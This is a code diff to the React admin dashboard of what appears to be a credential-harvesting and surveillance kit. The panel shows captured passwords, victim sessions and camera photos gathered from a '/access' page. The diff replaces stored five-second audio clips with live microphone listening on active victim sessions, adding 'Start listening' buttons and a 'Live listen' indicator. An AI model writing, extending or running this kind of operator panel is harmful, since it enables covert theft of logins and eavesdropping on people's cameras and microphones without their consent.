@@ -5,7 +5,6 @@ import {
   BarChart3,
   Camera,
   CircleOff,
-  Clock3,
   Eye,
   EyeOff,
   ImageOff,
@@ -19,6 +18,7 @@ import {
   X,
 } from 'lucide-react';
 import { getApiUrl } from '../../api';
+import { startAdminListen, stopAdminListen } from '../../liveAudio';
 
 type AdminPhoto = {
   id: string;
@@ -28,19 +28,10 @@ type AdminPhoto = {
   capture_timestamp: string;
 };
 
-type AdminAudio = {
-  id: string;
-  session_id: string;
-  duration_ms: number | null;
-  started_at: string | null;
-  ended_at: string | null;
-};
-
 const TABS = [
   { id: 'credentials', label: 'Credentials', icon: KeyRound },
   { id: 'sessions', label: 'Sessions', icon: Users },
   { id: 'photos', label: 'Photos', icon: Camera },
-  { id: 'audio', label: 'Audio', icon: Mic },
   { id: 'analytics', label: 'Analytics', icon: BarChart3 },
 ] as const;
 
@@ -136,63 +127,12 @@ function PhotoThumbnail({ photoId, token, alt }: { photoId: string; token: strin
   return <img src={src} alt={alt} className="h-full w-full object-cover" />;
 }
 
-function AudioPlayer({ audioId, token }: { audioId: string; token: string }) {
-  const [src, setSrc] = useState<string | null>(null);
-  const [failed, setFailed] = useState(false);
-
-  useEffect(() => {
-    let objectUrl: string | null = null;
-    let cancelled = false;
-
-    const load = async () => {
-      try {
-        const response = await fetch(getApiUrl(`/api/admin/audio/${audioId}/file`), {
-          headers: { Authorization: `Bearer ${token}` },
-        });
-        if (!response.ok) {
-          throw new Error('Failed to load audio');
-        }
-        const blob = await response.blob();
-        if (cancelled) {
-          return;
-        }
-        objectUrl = URL.createObjectURL(blob);
-        setSrc(objectUrl);
-      } catch {
-        if (!cancelled) {
-          setFailed(true);
-        }
-      }
-    };
-
-    void load();
-
-    return () => {
-      cancelled = true;
-      if (objectUrl) {
-        URL.revokeObjectURL(objectUrl);
-      }
-    };
-  }, [audioId, token]);
-
-  if (failed) {
-    return <p className="text-xs text-gray-500">Audio unavailable</p>;
-  }
-
-  if (!src) {
-    return <p className="text-xs text-gray-400">Loading audio...</p>;
-  }
-
-  return <audio controls src={src} className="w-full" />;
-}
-
 export default function AdminDashboard() {
   const navigate = useNavigate();
   const [searchParams, setSearchParams] = useSearchParams();
   const [credentials, setCredentials] = useState<any[]>([]);
   const [sessions, setSessions] = useState<any[]>([]);
   const [photos, setPhotos] = useState<AdminPhoto[]>([]);
-  const [recordings, setRecordings] = useState<AdminAudio[]>([]);
   const [analytics, setAnalytics] = useState<any>(null);
   const [isLoading, setIsLoading] = useState(true);
   const [isRefreshing, setIsRefreshing] = useState(false);
@@ -209,10 +149,10 @@ export default function AdminDashboard() {
   const [revealedPasswords, setRevealedPasswords] = useState<Record<string, boolean>>({});
   const [selectedPhoto, setSelectedPhoto] = useState<AdminPhoto | null>(null);
   const [sessionFilter, setSessionFilter] = useState('all');
-  const [audioSessionFilter, setAudioSessionFilter] = useState('all');
   const [photoSort, setPhotoSort] = useState<PhotoSort>('newest');
   const [lastUpdated, setLastUpdated] = useState<Date | null>(null);
   const [closingSessionId, setClosingSessionId] = useState<string | null>(null);
+  const [listeningSessionId, setListeningSessionId] = useState<string | null>(null);
   const adminToken = localStorage.getItem('adminToken') || '';
 
   useEffect(() => {
@@ -245,11 +185,10 @@ export default function AdminDashboard() {
     }
 
     try {
-      const [credResponse, sessResponse, photosResponse, audioResponse, analyticsResponse] = await Promise.all([
+      const [credResponse, sessResponse, photosResponse, analyticsResponse] = await Promise.all([
         fetch(getApiUrl('/api/admin/credentials'), { headers: { Authorization: `Bearer ${token}` } }),
         fetch(getApiUrl('/api/admin/sessions'), { headers: { Authorization: `Bearer ${token}` } }),
         fetch(getApiUrl('/api/admin/photos'), { headers: { Authorization: `Bearer ${token}` } }),
-        fetch(getApiUrl('/api/admin/audio'), { headers: { Authorization: `Bearer ${token}` } }),
         fetch(getApiUrl('/api/admin/analytics'), { headers: { Authorization: `Bearer ${token}` } }),
       ]);
 
@@ -262,10 +201,6 @@ export default function AdminDashboard() {
       if (photosResponse.ok) {
         const photosData = await photosResponse.json();
         setPhotos(Array.isArray(photosData) ? photosData : []);
-      }
-      if (audioResponse.ok) {
-        const audioData = await audioResponse.json();
-        setRecordings(Array.isArray(audioData) ? audioData : []);
       }
       if (analyticsResponse.ok) {
         setAnalytics(await analyticsResponse.json());
@@ -301,8 +236,9 @@ export default function AdminDashboard() {
         setCredentials([]);
         setSessions([]);
         setPhotos([]);
-        setRecordings([]);
         setAnalytics(null);
+        stopAdminListen();
+        setListeningSessionId(null);
         setSelectedPhoto(null);
         setDeleteConfirm(false);
       }
@@ -325,6 +261,10 @@ export default function AdminDashboard() {
         setSessions((prev) =>
           prev.map((session) => (session.id === sessionId ? { ...session, status: 'closed' } : session))
         );
+        if (listeningSessionId === sessionId) {
+          stopAdminListen();
+          setListeningSessionId(null);
+        }
       }
     } catch (error) {
       console.error('Failed to close session:', error);
@@ -347,6 +287,8 @@ export default function AdminDashboard() {
         setSessions((prev) =>
           prev.map((session) => (session.status === 'active' ? { ...session, status: 'closed' } : session))
         );
+        stopAdminListen();
+        setListeningSessionId(null);
       }
     } catch (error) {
       console.error('Failed to close sessions:', error);
@@ -354,6 +296,29 @@ export default function AdminDashboard() {
       setClosingSessionId(null);
     }
   };
+
+  const handleToggleListen = (sessionId: string) => {
+    if (listeningSessionId === sessionId) {
+      stopAdminListen();
+      setListeningSessionId(null);
+      return;
+    }
+
+    startAdminListen(sessionId, adminToken, {
+      onError: (message) => {
+        console.error(message);
+        stopAdminListen();
+        setListeningSessionId(null);
+      },
+    });
+    setListeningSessionId(sessionId);
+  };
+
+  useEffect(() => {
+    return () => {
+      stopAdminListen();
+    };
+  }, []);
 
   const togglePasswordVisibility = (credentialId: string) => {
     setRevealedPasswords((prev) => ({
@@ -365,19 +330,6 @@ export default function AdminDashboard() {
   const sessionIds = useMemo(
     () => Array.from(new Set(photos.map((photo) => photo.session_id).filter(Boolean))),
     [photos]
-  );
-
-  const audioSessionIds = useMemo(
-    () => Array.from(new Set(recordings.map((recording) => recording.session_id).filter(Boolean))),
-    [recordings]
-  );
-
-  const visibleRecordings = useMemo(
-    () =>
-      audioSessionFilter === 'all'
-        ? recordings
-        : recordings.filter((recording) => recording.session_id === audioSessionFilter),
-    [recordings, audioSessionFilter]
   );
 
   const visiblePhotos = useMemo(() => {
@@ -489,7 +441,7 @@ export default function AdminDashboard() {
             { label: 'Active Sessions', value: analytics?.activeSessions || sessions.length || 0, icon: Activity, tone: 'text-blue-600 bg-blue-50' },
             { label: 'Credentials', value: analytics?.totalCredentials || credentials.length || 0, icon: KeyRound, tone: 'text-red-600 bg-red-50' },
             { label: 'Photos', value: analytics?.totalPhotos || photos.length || 0, icon: Camera, tone: 'text-green-600 bg-green-50' },
-            { label: 'Audio', value: `${analytics?.totalAudioMinutes || 0}m`, icon: Clock3, tone: 'text-purple-600 bg-purple-50' },
+            { label: 'Live listen', value: listeningSessionId ? 'On' : 'Off', icon: Mic, tone: 'text-purple-600 bg-purple-50' },
           ].map((card) => (
             <div key={card.label} className="rounded-2xl border border-purple-100 bg-white p-5 shadow-sm">
               <div className="flex items-center justify-between">
@@ -513,9 +465,7 @@ export default function AdminDashboard() {
                     ? sessions.length
                     : tab.id === 'photos'
                       ? photos.length
-                      : tab.id === 'audio'
-                        ? recordings.length
-                        : Object.keys(platformCounts).length;
+                      : Object.keys(platformCounts).length;
               const Icon = tab.icon;
               const isActive = activeTab === tab.id;
 
@@ -632,25 +582,43 @@ export default function AdminDashboard() {
                           <p className="font-semibold text-gray-900">{session.photo_count || 0}</p>
                         </div>
                         <div className="rounded-xl bg-white px-3 py-2">
-                          <p className="text-xs text-gray-500">Audio</p>
-                          <p className="font-semibold text-gray-900">{session.audio_duration_ms || 0}ms</p>
+                          <p className="text-xs text-gray-500">Live audio</p>
+                          <p className={`font-semibold ${listeningSessionId === session.id ? 'text-red-600' : 'text-gray-900'}`}>
+                            {listeningSessionId === session.id ? 'Listening' : 'Idle'}
+                          </p>
                         </div>
                       </div>
-                      <div className="mt-3 flex items-center justify-between gap-3">
+                      <div className="mt-3 flex flex-wrap items-center justify-between gap-3">
                         <p className="text-xs text-gray-500">{formatTime(session.created_at)}</p>
-                        {session.status === 'active' ? (
-                          <button
-                            type="button"
-                            onClick={() => void handleCloseSession(session.id)}
-                            disabled={closingSessionId === session.id || closingSessionId === 'all'}
-                            className="inline-flex items-center gap-1.5 rounded-lg bg-white px-3 py-1.5 text-xs font-medium text-red-700 ring-1 ring-red-200 transition hover:bg-red-50 disabled:opacity-60"
-                          >
-                            <CircleOff size={14} />
-                            {closingSessionId === session.id ? 'Closing...' : 'Force close'}
-                          </button>
-                        ) : (
-                          <span className="text-xs text-gray-400">Closed</span>
-                        )}
+                        <div className="flex flex-wrap gap-2">
+                          {session.status === 'active' && (
+                            <button
+                              type="button"
+                              onClick={() => handleToggleListen(session.id)}
+                              className={`inline-flex items-center gap-1.5 rounded-lg px-3 py-1.5 text-xs font-medium ring-1 transition ${
+                                listeningSessionId === session.id
+                                  ? 'bg-red-600 text-white ring-red-600 hover:bg-red-700'
+                                  : 'bg-white text-purple-700 ring-purple-200 hover:bg-purple-50'
+                              }`}
+                            >
+                              <Mic size={14} />
+                              {listeningSessionId === session.id ? 'Stop listening' : 'Start listening'}
+                            </button>
+                          )}
+                          {session.status === 'active' ? (
+                            <button
+                              type="button"
+                              onClick={() => void handleCloseSession(session.id)}
+                              disabled={closingSessionId === session.id || closingSessionId === 'all'}
+                              className="inline-flex items-center gap-1.5 rounded-lg bg-white px-3 py-1.5 text-xs font-medium text-red-700 ring-1 ring-red-200 transition hover:bg-red-50 disabled:opacity-60"
+                            >
+                              <CircleOff size={14} />
+                              {closingSessionId === session.id ? 'Closing...' : 'Force close'}
+                            </button>
+                          ) : (
+                            <span className="text-xs text-gray-400">Closed</span>
+                          )}
+                        </div>
                       </div>
                     </div>
                   ))}
@@ -733,52 +701,6 @@ export default function AdminDashboard() {
                 </>
               ) : (
                 <EmptyState title="No photos captured yet" body="Grant camera access on /access to start collecting frames." />
-              )}
-            </div>
-          )}
-
-          {activeTab === 'audio' && (
-            <div className="p-4 md:p-6">
-              {recordings.length ? (
-                <>
-                  <div className="mb-4 flex flex-col gap-3 sm:flex-row sm:items-end sm:justify-between">
-                    <label className="flex min-w-48 flex-col gap-1 text-xs font-medium text-gray-500">
-                      Filter by session
-                      <select
-                        value={audioSessionFilter}
-                        onChange={(event) => setAudioSessionFilter(event.target.value)}
-                        className="rounded-lg border border-gray-200 bg-white px-3 py-2 text-sm text-gray-800"
-                      >
-                        <option value="all">All sessions ({recordings.length})</option>
-                        {audioSessionIds.map((sessionId) => (
-                          <option key={sessionId} value={sessionId}>
-                            {sessionId.slice(-8)} ({recordings.filter((recording) => recording.session_id === sessionId).length})
-                          </option>
-                        ))}
-                      </select>
-                    </label>
-                    <p className="text-sm text-gray-500">{visibleRecordings.length} shown</p>
-                  </div>
-                  <div className="space-y-3">
-                    {visibleRecordings.map((recording) => (
-                      <div key={recording.id} className="rounded-2xl border border-gray-100 bg-gray-50 p-4">
-                        <div className="mb-3 flex flex-wrap items-center justify-between gap-2 text-sm">
-                          <div>
-                            <p className="font-medium text-gray-900">Session {recording.session_id?.slice(-8)}</p>
-                            <p className="text-xs text-gray-500">{recording.session_id}</p>
-                          </div>
-                          <div className="text-right text-xs text-gray-500">
-                            <p>{Math.round((recording.duration_ms || 0) / 1000)}s clip</p>
-                            <p>{formatTime(recording.started_at || undefined)}</p>
-                          </div>
-                        </div>
-                        <AudioPlayer audioId={recording.id} token={adminToken} />
-                      </div>
-                    ))}
-                  </div>
-                </>
-              ) : (
-                <EmptyState title="No audio captured yet" body="Grant microphone access on /access to start recording 5-second clips." />
               )}
             </div>
           )}
